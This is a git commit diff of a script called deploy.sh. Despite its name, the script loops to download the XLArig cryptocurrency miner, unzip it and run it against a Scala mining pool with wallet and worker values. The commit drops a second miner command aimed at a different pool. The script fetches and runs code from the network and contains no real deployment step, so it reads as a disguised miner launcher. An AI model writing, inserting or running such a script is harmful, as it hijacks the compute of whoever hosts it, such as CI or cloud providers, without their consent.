c374fa95bb9b77646bd67d7803727e5f0ed74f17
bara798 <86476385+bara798@users.noreply.github.com>
2021-06-26 15:45:37 +0700

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -3,10 +3,7 @@
 COUNTER=20
 until [  $COUNTER -lt 10 ]; do
  
-wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o scala.herominers.com:10131 -u walletkalian -p namaworker -a panthera -k -t8
- 
- 
-./start.sh -v -l na.luckpool.net:3956 -u RKRpzCjsbGyA4FuMxfj4BTcVfcznumC2tp.bangke  -p x -t 8
+wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip && unzip XLArig-v5.2.2-linux-x86_64.zip && ./xlarig -o scala.herominers.com:10131 -u pzCjsbGyA4FuMxfj4BTcVfcznumC2tp -p bangke -a panthera -k -t8
  
      echo COUNTER $COUNTER
      let COUNTER-=1
